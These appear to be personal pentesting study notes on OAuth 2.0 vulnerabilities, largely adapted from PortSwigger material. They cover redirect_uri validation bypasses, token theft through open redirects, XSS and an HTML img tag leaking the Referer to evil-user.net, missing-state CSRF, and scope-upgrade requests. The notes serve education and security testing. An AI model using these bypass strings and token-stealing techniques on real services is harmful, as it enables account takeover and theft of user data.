- Vulnerabilities in the client application
    - **Improper implementation of the implicit grant type**: if implicit flow is used, and the user send to client server to specific endpoint that `name=wiener&email=asdf@.com&access_token=asdf`
      Then this is vulnerable because we can change parameters values, which can enable us to access other people resources.
    - **Flawed CSRF protection**: If you didn't find `state` query parameter, that mean OAuth2 is vulnerable to CSRF. what happens is when accessing resource with uri like 
      `https://client.com/oauth-linking?code=52qyUjrasdf`, we inject our code "which will be token" that the victim will use instead of his token. So the resource provider will answer him with results of attacker data instead of victim data. `code = Social_media_account` we are injecting our social media.
- Vulnerabilities in the OAuth service
    - **Leaking authorization codes and access tokens**: Refere to [[redirect_uri hardening]]. Try to put tamper the `redirect_uri` then try to get session.
	    - **Flawed redirect_uri validation**: You may be able to trick the `redirect_uri` validation using [[Web/SSRF/1. Ideas|SSRF ideas]], Or having target domain as subdomain in attack domain, or parameter pollution.
	    - **Stealing codes and access tokens via a proxy page**: Using `open redirect`, `XSS`, `DOM` to retrive `code` and if app use implicit flow you can get`access token`.
    - **Flawed scope validation**:
    - **Unverified user registration**: If OAuth provider doesn't validate the profile account like email. the attacker can use this to put an email of target administrator in client application.
---
## Recon
You should always check the OAuth provider documentation, to learn more about their configurations and endpoints and what data will retrieve.

Check some standerds:
```sh
# endpoints returns JSON file contain key information.
/.well-known/oauth-authorization-server
/.well-known/openid-configuration
```

---
## Vulnerabilities in the OAuth client application
### Improper implementation of the implicit grant type
In this flow, the access token is sent from the OAuth service to the client application via the user's browser as a URL fragment. The client application then accesses the token using JavaScript. The trouble is, if the application wants to maintain the session after the user closes the page, it needs to store the current user data (normally a user ID and the access token) somewhere.

To solve this problem, the client application will often submit this data to the server in a `POST` request and then assign the user a session cookie, effectively logging them in. This request is roughly equivalent to the form submission request that might be sent as part of a classic, password-based login. However, in this scenario, the server does not have any secrets or passwords to compare with the submitted data, which means that it is implicitly trusted.

In the implicit flow, this `POST` request is exposed to attackers via their browser. As a result, this behavior can lead to a serious vulnerability if the client application doesn't properly check that the access token matches the other data in the request. In this case, an attacker can simply change the parameters sent to the server to impersonate any user.

mitigations would be using JWT signed by the authorization server, or the client should send request to authorization server with the access_token to request user identity for one time.

---
### Flawed CSRF protection
Although many components of the OAuth flows are optional, some of them are strongly recommended unless there's an important reason not to use them. One such example is the `state` parameter.

The `state` parameter should ideally contain an unguessable value, such as the hash of something tied to the user's session when it first initiates the OAuth flow. This value is then passed back and forth between the client application and the OAuth service as a form of CSRF token for the client application. Therefore, if you notice that the authorization request does not send a `state` parameter, this is extremely interesting from an attacker's perspective. It potentially means that they can initiate an OAuth flow themselves before tricking a user's browser into completing it, similar to a traditional CSRF attack. This can have severe consequences depending on how OAuth is being used by the client application.

Consider a website that allows users to log in using either a classic, password-based mechanism or by linking their account to a social media profile using OAuth. In this case, if the application fails to use the `state` parameter, an attacker could potentially hijack a victim user's account on the client application by binding it to their own social media account.

Note that if the site allows users to log in exclusively via OAuth, the `state` parameter is arguably less critical. However, not using a `state` parameter can still allow attackers to construct login CSRF attacks, whereby the user is tricked into logging in to the attacker's account.

If you can make victims use your `code`, or `access token`. Then the victim will interact with the resource server using your token so it will get your data. This is useful when there is link your account with social media account.

---
### Leaking authorization codes and access tokens

Refere to [[redirect_uri hardening]]

Perhaps the most infamous OAuth-based vulnerability is when the configuration of the OAuth service itself enables attackers to steal authorization codes or access tokens associated with other users' accounts. By stealing a valid code or token, the attacker may be able to access the victim's data. Ultimately, this can completely compromise their account - the attacker could potentially log in as the victim user on any client application that is registered with this OAuth service.

Depending on the grant type, either a code or token is sent via the victim's browser to the `/callback` endpoint specified in the `redirect_uri` parameter of the authorization request. If the OAuth service fails to validate this URI properly, an attacker may be able to construct a CSRF-like attack, tricking the victim's browser into initiating an OAuth flow that will send the code or token to an attacker-controlled `redirect_uri`.

In the case of the authorization code flow, an attacker can potentially steal the victim's code before it is used. They can then send this code to the client application's legitimate `/callback` endpoint (the original `redirect_uri`) to get access to the user's account. In this scenario, an attacker does not even need to know the client secret or the resulting access token. As long as the victim has a valid session with the OAuth service, the client application will simply complete the code/token exchange on the attacker's behalf before logging them in to the victim's account.

Note that using `state` or `nonce` protection does not necessarily prevent these attacks because an attacker can generate new values from their own browser.

More secure authorization servers will require a `redirect_uri` parameter to be sent when exchanging the code as well. The server can then check whether this matches the one it received in the initial authorization request and reject the exchange if not. As this happens in server-to-server requests via a secure back-channel, the attacker is not able to control this second `redirect_uri` parameter.

#### Flawed redirect_uri validation

Due to the kinds of attacks seen in the previous lab, it is best practice for client applications to provide a whitelist of their genuine callback URIs when registering with the OAuth service. This way, when the OAuth service receives a new request, it can validate the `redirect_uri` parameter against this whitelist. In this case, supplying an external URI will likely result in an error. However, there may still be ways to bypass this validation.

When auditing an OAuth flow, you should try experimenting with the `redirect_uri` parameter to understand how it is being validated. For example:

- Some implementations allow for a range of subdirectories by checking only that the string starts with the correct sequence of characters i.e. an approved domain. You should try removing or adding arbitrary paths, query parameters, and fragments to see what you can change without triggering an error.
- If you can append extra values to the default `redirect_uri` parameter, you might be able to exploit discrepancies between the parsing of the URI by the different components of the OAuth service. For example, you can try techniques such as the following and refer to :
```
https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/
```
 If you're not familiar with these techniques, we recommend reading our content on how to [[Web/SSRF/1. Ideas|SSRF ideas]] and [[Web/Client Side/CORS/1. Ideas| CORS ideas]].
- You may occasionally come across server-side parameter pollution vulnerabilities. Just in case, you should try submitting duplicate `redirect_uri` parameters as follows:    
```
https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net
```
- Some servers also give special treatment to `localhost` URIs as they're often used during development. In some cases, any redirect URI beginning with `localhost` may be accidentally permitted in the production environment. This could allow you to bypass the validation by registering a domain name such as `localhost.evil-user.net`.

It is important to note that you shouldn't limit your testing to just probing the `redirect_uri` parameter in isolation. In the wild, you will often need to experiment with different combinations of changes to several parameters. Sometimes changing one parameter can affect the validation of others. For example, changing the `response_mode` from `query` to `fragment` can sometimes completely alter the parsing of the `redirect_uri`, allowing you to submit URIs that would otherwise be blocked. Likewise, if you notice that the `web_message` response mode is supported, this often allows a wider range of subdomains in the `redirect_uri`.

#### Stealing codes and access tokens via a proxy page

- Utilize `open redirect`, this one is hard to understand `open redirect + OAuth2`, refere to [[Fragment + open_redirect]]. ==It only work in implicit OAuth application==.
- Utilize `XSS`, `DOM`, `HTML` inject. which work on both implicit and code flow.


Against more robust targets, you might find that no matter what you try, you are unable to successfully submit an external domain as the `redirect_uri`. However, that doesn't mean it's time to give up.

By this stage, you should have a relatively good understanding of which parts of the URI you can tamper with. The key now is to use this knowledge to try and access a wider attack surface within the client application itself. In other words, try to work out whether you can change the `redirect_uri` parameter to point to any other pages on a whitelisted domain.

Try to find ways that you can successfully access different subdomains or paths. For example, the default URI will often be on an OAuth-specific path, such as `/oauth/callback`, which is unlikely to have any interesting subdirectories. However, you may be able to use directory traversal tricks to supply any arbitrary path on the domain. Something like this:
```
https://client-app.com/oauth/callback/../../example/path
```

May be interpreted on the back-end as:
```
https://client-app.com/example/path
```

Once you identify which other pages you are able to set as the redirect URI, you should audit them for additional vulnerabilities that you can potentially use to leak the code or token. For the [authorization code flow](https://portswigger.net/web-security/oauth/grant-types#authorization-code-grant-type), you need to find a vulnerability that gives you access to the query parameters, whereas for the [implicit grant type](https://portswigger.net/web-security/oauth/grant-types#implicit-grant-type), you need to extract the URL fragment.

One of the most useful vulnerabilities for this purpose is an open redirect. You can use this as a proxy to forward victims, along with their code or token, to an attacker-controlled domain where you can host any malicious script you like.

Note that for the implicit grant type, stealing an access token doesn't just enable you to log in to the victim's account on the client application. As the entire implicit flow takes place via the browser, you can also use the token to make your own API calls to the OAuth service's resource server. This may enable you to fetch sensitive user data that you cannot normally access from the client application's web UI.


> [!Attention] 
> The uri fragment will be appended while doing redirect. referece to [[Fragment + open_redirect]]


In addition to open redirects, you should look for any other vulnerabilities that allow you to extract the code or token and send it to an external domain. Some good examples include:
- **Dangerous JavaScript that handles query parameters and URL fragments**  
    For example, insecure web messaging scripts can be great for this. In some scenarios, you may have to identify a longer gadget chain that allows you to pass the token through a series of scripts before eventually leaking it to your external domain.
- **XSS vulnerabilities**  
    Although XSS attacks can have a huge impact on their own, there is typically a small time frame in which the attacker has access to the user's session before they close the tab or navigate away. As the `HTTPOnly` attribute is commonly used for session cookies, an attacker will often also be unable to access them directly using XSS. However, by stealing an OAuth code or token, the attacker can gain access to the user's account in their own browser. This gives them much more time to explore the user's data and perform harmful actions, significantly increasing the severity of the XSS vulnerability.
- **HTML injection vulnerabilities**  
    In cases where you cannot inject JavaScript (for example, due to CSP constraints or strict filtering), you may still be able to use a simple HTML injection to steal authorization codes. If you can point the `redirect_uri` parameter to a page on which you can inject your own HTML content, you might be able to leak the code via the `Referer` header. For example, consider the following `img` element: `<img src="evil-user.net">`. When attempting to fetch this image, some browsers (such as Firefox) will send the full URL in the `Referer` header of the request, including the query string.

---

### Flawed scope validation

In any OAuth flow, the user must approve the requested access based on the scope defined in the authorization request. The resulting token allows the client application to access only the scope that was approved by the user. But in some cases, it may be possible for an attacker to "upgrade" an access token (either stolen or obtained using a malicious client application) with extra permissions due to flawed validation by the OAuth service. The process for doing this depends on the grant type.

#### Scope upgrade: authorization code flow

With the [authorization code grant type](https://portswigger.net/web-security/oauth/grant-types#authorization-code-grant-type), the user's data is requested and sent via secure server-to-server communication, which a third-party attacker is typically not able to manipulate directly. However, it may still be possible to achieve the same result by registering their own client application with the OAuth service.

For example, let's say the attacker's malicious client application initially requested access to the user's email address using the `openid email` scope. After the user approves this request, the malicious client application receives an authorization code. As the attacker controls their client application, they can add another `scope` parameter to the code/token exchange request containing the additional `profile` scope:

```http
POST /token HTTP/1.1
Host: oauth-authorization-server.com
…
client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8&scope=openid%20 email%20profile
```

If the server does not validate this against the scope from the initial authorization request, it will sometimes generate an access token using the new scope and send this to the attacker's client application:

```json
{
    "access_token": "z0y9x8w7v6u5",
    "token_type": "Bearer",
    "expires_in": 3600,
    "scope": "openid email profile",
    …
}
```

The attacker can then use their application to make the necessary API calls to access the user's profile data.

#### Scope upgrade: implicit flow

For the [implicit grant type](https://portswigger.net/web-security/oauth/grant-types#implicit-grant-type), the access token is sent via the browser, which means an attacker can steal tokens associated with innocent client applications and use them directly. Once they have stolen an access token, they can send a normal browser-based request to the OAuth service's `/userinfo` endpoint, manually adding a new `scope` parameter in the process.

Ideally, the OAuth service should validate this `scope` value against the one that was used when generating the token, but this isn't always the case. As long as the adjusted permissions don't exceed the level of access previously granted to this client application, the attacker can potentially access additional data without requiring further approval from the user.

---
### Unverified user registration

When authenticating users via OAuth, the client application makes the implicit assumption that the information stored by the OAuth provider is correct. This can be a dangerous assumption to make.

Some websites that provide an OAuth service allow users to register an account without verifying all of their details, including their email address in some cases. An attacker can exploit this by registering an account with the OAuth provider using the same details as a target user, such as a known email address. Client applications may then allow the attacker to sign in as the victim via this fraudulent account with the OAuth provider.